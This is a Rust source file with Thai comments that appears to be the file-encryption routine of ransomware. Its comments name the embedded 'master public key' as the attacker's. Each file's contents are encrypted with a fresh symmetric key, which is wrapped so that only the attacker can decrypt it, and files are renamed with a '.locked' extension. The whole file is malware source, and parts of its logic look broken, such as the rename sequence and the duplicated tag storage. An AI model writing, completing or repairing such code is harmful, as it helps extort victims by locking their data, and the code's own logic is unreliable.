use chacha20poly1305::{
    aead::{Aead, KeyInit, generic_array::GenericArray},
    ChaCha20Poly1305,
};
use x25519_dalek::{PublicKey, EphemeralSecret, SharedSecret};
use rand::{RngCore, rngs::OsRng};
use std::fs::File;
use std::io::{Read, Write, BufReader, BufWriter};
use std::path::Path;

// Master public key ของเรา (attacker) - เปลี่ยนเป็นของจริงตอน compile
const MASTER_PUBLIC_KEY: [u8; 32] = [
    0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
    0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
    0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
    0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
];

pub fn encrypt_file(path: &Path) -> std::io::Result<()> {
    // สร้าง symmetric key ใหม่สำหรับไฟล์นี้ (ChaCha20Poly1305)
    let sym_key = ChaCha20Poly1305::generate_key(&mut OsRng);
    let cipher = ChaCha20Poly1305::new(&sym_key);

    // สร้าง ephemeral key pair สำหรับ hybrid encryption
    let ephemeral_secret = EphemeralSecret::random_from_rng(OsRng);
    let ephemeral_pub = PublicKey::from(&ephemeral_secret);

    // Derive shared secret กับ master public key
    let master_pub = PublicKey::from(MASTER_PUBLIC_KEY);
    let shared: SharedSecret = ephemeral_secret.diffie_hellman(&master_pub);

    // ใช้ shared secret เป็น seed สร้าง key จริงสำหรับ encrypt sym_key (simple KDF)
    let mut encrypted_sym_key_key = [0u8; 32];
    encrypted_sym_key_key.copy_from_slice(&shared.to_bytes());

    let key_cipher = ChaCha20Poly1305::new(GenericArray::from_slice(&encrypted_sym_key_key));

    // Nonce เป็นศูนย์เพื่อ simplicity (ในของจริงควร random)
    let nonce = GenericArray::from_slice(&[0u8; 12]);

    // เข้ารหัส symmetric key
    let encrypted_sym_key = key_cipher.encrypt(nonce, sym_key.as_slice())
        .expect("Encryption failure!");

    // เปิดไฟล์เดิมสำหรับอ่าน
    let input_file = File::open(path)?;
    let mut reader = BufReader::new(input_file);

    // สร้างไฟล์ temp สำหรับเขียน encrypted data
    let temp_path = path.with_extension("tmp");
    let output_file = File::create(&temp_path)?;
    let mut writer = BufWriter::new(output_file);

    // อ่านและเข้ารหัสแบบ chunk-by-chunk ด้วย AEAD
    let mut buffer = [0u8; 1048576]; // 1MB chunks
    let mut chunk_metadata = Vec::new();

    loop {
        let bytes_read = reader.read(&mut buffer)?;
        if bytes_read == 0 {
            break;
        }

        // สร้าง nonce ใหม่สำหรับ chunk นี้
        let mut chunk_nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut chunk_nonce_bytes);
        let chunk_nonce = GenericArray::from_slice(&chunk_nonce_bytes);

        // เข้ารหัส chunk นี้
        let ciphertext = cipher.encrypt(chunk_nonce, &buffer[..bytes_read])
            .expect("Encryption failure!");

        // เขียน ciphertext
        writer.write_all(&ciphertext)?;

        // เก็บ metadata: nonce + tag (tag is last 16 bytes of ciphertext)
        let tag_start = ciphertext.len() - 16;
        chunk_metadata.extend_from_slice(&chunk_nonce_bytes);
        chunk_metadata.extend_from_slice(&ciphertext[tag_start..]);
    }

    // เขียน chunk metadata (nonces and tags)
    writer.write_all(&chunk_metadata)?;

    // เขียน encrypted_sym_key และ ephemeral_pub ต่อท้าย
    writer.write_all(&encrypted_sym_key)?;
    writer.write_all(ephemeral_pub.as_bytes())?;

    // ปิดไฟล์
    drop(writer);

    // เปลี่ยนนามสกุลไฟล์เดิม
    let new_path = path.with_extension("locked");
    std::fs::rename(path, &new_path)?;

    // ย้าย temp ไปเป็นไฟล์เดิม
    std::fs::rename(&temp_path, path)?;

    Ok(())
}